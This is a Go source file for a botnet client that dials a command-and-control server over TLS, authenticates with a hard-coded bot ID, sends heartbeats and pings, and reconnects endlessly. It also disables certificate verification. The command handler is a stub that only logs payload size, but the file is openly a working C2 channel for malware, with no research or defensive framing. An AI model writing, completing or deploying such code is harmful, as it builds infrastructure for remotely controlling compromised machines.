package main

import (
	"crypto/sha256"
	"crypto/tls"
	"encoding/binary"
	"fmt"
	"io"
	"net"
	"time"
)

// ---------- packet constants ----------
const (
	PacketTypePing         = 0x01
	PacketTypePong         = 0x02
	PacketTypeCommand      = 0x03
	PacketTypeDiagnostic   = 0x04
	PacketTypeHeartbeat    = 0x05
	PacketTypeAuth         = 0x06
	PacketTypeAuthResponse = 0x07
)

// ---------- packet structures ----------
type PacketHeader struct {
	Type      uint8
	Length    uint32
	Timestamp int64
	Checksum  uint16
}

type Packet struct {
	Header  PacketHeader
	Payload []byte
}

// ---------- bot ----------
type Bot struct {
	botID    string
	server   string
	conn     *tls.Conn
	stopChan chan struct{}
}

func NewBot(botID, server string) *Bot {
	return &Bot{
		botID:    botID,
		server:   server,
		stopChan: make(chan struct{}),
	}
}

func (b *Bot) Start() {
	for {
		select {
		case <-b.stopChan:
			return
		default:
			if err := b.connect(); err != nil {
				fmt.Printf("[bot] connection failed: %v  (retrying in 5s)\n", err)
				time.Sleep(5 * time.Second)
				continue
			}
			if err := b.handleConnection(); err != nil {
				fmt.Printf("[bot] connection handler: %v\n", err)
			}
			if b.conn != nil {
				b.conn.Close()
			}
			fmt.Println("[bot] disconnected – reconnecting...")
			time.Sleep(5 * time.Second)
		}
	}
}

func (b *Bot) connect() error {
	fmt.Println("[bot] dialing C2 server...")
	// Use a timeout for the initial connection attempt
	dialer := &net.Dialer{Timeout: 10 * time.Second}
	conn, err := tls.DialWithDialer(dialer, "tcp", b.server, &tls.Config{InsecureSkipVerify: true})
	if err != nil {
		return fmt.Errorf("tls dial: %w", err)
	}
	b.conn = conn
	fmt.Println("[bot] connected – starting auth")

	// Ensure connection is closed on any error path within this function
	var success bool
	defer func() {
		if !success && b.conn != nil {
			b.conn.Close()
		}
	}()

	authPacket := CreatePacket(PacketTypeAuth, []byte(b.botID))
	if err := SendPacket(b.conn, authPacket); err != nil {
		return fmt.Errorf("send auth: %w", err)
	}

	resp, err := ReceivePacket(b.conn)
	if err != nil {
		return fmt.Errorf("recv auth resp: %w", err)
	}
	if resp.Header.Type != PacketTypeAuthResponse {
		return fmt.Errorf("unexpected auth resp type %d", resp.Header.Type)
	}
	fmt.Println("[bot] authentication successful")
	success = true // Mark as successful to prevent deferred close
	return nil
}

func (b *Bot) handleConnection() error {
	stopHb := make(chan struct{})
	defer close(stopHb)
	go b.heartbeatRoutine(stopHb)

	for {
		packet, err := ReceivePacket(b.conn)
		if err != nil {
			if err == io.EOF {
				fmt.Println("[bot] server closed connection")
				return nil
			}
			return fmt.Errorf("recv packet: %w", err)
		}
		switch packet.Header.Type {
		case PacketTypePing:
			if err := b.sendPong(); err != nil {
				return err
			}
		case PacketTypeCommand:
			b.handleCommand(packet)
		case PacketTypeHeartbeat:
			if err := b.sendHeartbeatResponse(); err != nil {
				return err
			}
		default:
			fmt.Printf("[bot] unknown packet type %d\n", packet.Header.Type)
		}
	}
}

func (b *Bot) heartbeatRoutine(stop <-chan struct{}) {
	tick := time.NewTicker(5 * time.Second)
	pingTick := time.NewTicker(15 * time.Second)
	defer tick.Stop()
	defer pingTick.Stop()

	for {
		select {
		case <-tick.C:
			if err := b.sendHeartbeat(); err != nil {
				fmt.Printf("[bot] heartbeat send: %v\n", err)
				return
			}
		case <-pingTick.C:
			if err := b.sendAuthPacket(PacketTypePing, []byte("|ping|")); err != nil {
				fmt.Printf("[bot] ping send: %v\n", err)
				return
			}
		case <-stop:
			return
		}
	}
}

// ---------- heartbeat / pong ----------
func (b *Bot) sendHeartbeat() error {
	return b.sendAuthPacket(PacketTypeHeartbeat, []byte("|heartbeat|"))
}
func (b *Bot) sendHeartbeatResponse() error {
	return b.sendAuthPacket(PacketTypeHeartbeat, []byte("|heartbeat_response|"))
}
func (b *Bot) sendPong() error {
	return b.sendAuthPacket(PacketTypePong, []byte("|pong|"))
}
func (b *Bot) sendAuthPacket(typ uint8, marker []byte) error {
	payload := append([]byte(b.botID), marker...)
	pkt := CreatePacket(typ, payload)
	return SendPacket(b.conn, pkt)
}

func (b *Bot) handleCommand(pkt Packet) {
	fmt.Printf("[bot] received command (%d bytes)\n", len(pkt.Payload))
}

// ---------- packet layer ----------
func CreatePacket(typ uint8, payload []byte) Packet {
	ts := time.Now().UnixNano()
	// build full buffer first (header + payload) – checksum over [0:17] and [19:]
	buf := make([]byte, 19+len(payload))
	buf[0] = typ
	binary.BigEndian.PutUint32(buf[1:5], uint32(len(payload)))
	binary.BigEndian.PutUint64(buf[5:13], uint64(ts))
	// checksum slot zero for now
	copy(buf[19:], payload)

	// checksum = sha256(header[0:17] || payload) -> first 2 bytes
	sum := sha256.Sum256(append(buf[0:17], buf[19:]...))
	binary.BigEndian.PutUint16(buf[17:19], uint16(binary.BigEndian.Uint16(sum[0:2])))

	return Packet{
		Header: PacketHeader{
			Type:      typ,
			Length:    uint32(len(payload)),
			Timestamp: ts,
			Checksum:  binary.BigEndian.Uint16(buf[17:19]),
		},
		Payload: payload,
	}
}

func SendPacket(conn net.Conn, pkt Packet) error {
	buf := make([]byte, 19+len(pkt.Payload))
	buf[0] = pkt.Header.Type
	binary.BigEndian.PutUint32(buf[1:5], pkt.Header.Length)
	binary.BigEndian.PutUint64(buf[5:13], uint64(pkt.Header.Timestamp))
	// bytes 13:17 remain zero to match server packet layout
	binary.BigEndian.PutUint16(buf[17:19], pkt.Header.Checksum)
	copy(buf[19:], pkt.Payload)

	_, err := conn.Write(buf)
	return err
}

func ReceivePacket(conn net.Conn) (Packet, error) {
	conn.SetReadDeadline(time.Now().Add(30 * time.Second))
	defer conn.SetReadDeadline(time.Time{})

	hdrBuf := make([]byte, 19)
	if _, err := io.ReadFull(conn, hdrBuf); err != nil {
		return Packet{}, err
	}
	var hdr PacketHeader
	hdr.Type = hdrBuf[0]
	hdr.Length = binary.BigEndian.Uint32(hdrBuf[1:5])
	hdr.Timestamp = int64(binary.BigEndian.Uint64(hdrBuf[5:13]))
	hdr.Checksum = binary.BigEndian.Uint16(hdrBuf[17:19])

	if hdr.Length > 16*1024 { // max 16 KB payload
		return Packet{}, fmt.Errorf("packet too large (%d bytes)", hdr.Length)
	}
	var payload []byte
	if hdr.Length > 0 {
		payload = make([]byte, hdr.Length)
		if _, err := io.ReadFull(conn, payload); err != nil {
			return Packet{}, err
		}
	}
	// verify checksum
	full := make([]byte, 0, 17+len(payload))
	full = append(full, hdrBuf[0:17]...)
	full = append(full, payload...)
	sum := sha256.Sum256(full)
	if binary.BigEndian.Uint16(sum[0:2]) != hdr.Checksum {
		return Packet{}, fmt.Errorf("checksum mismatch")
	}
	return Packet{Header: hdr, Payload: payload}, nil
}

// ---------- main ----------
func main() {
	bot := NewBot("e088c89c39ffec9e", "192.168.0.216:7002")
	bot.Start()
}
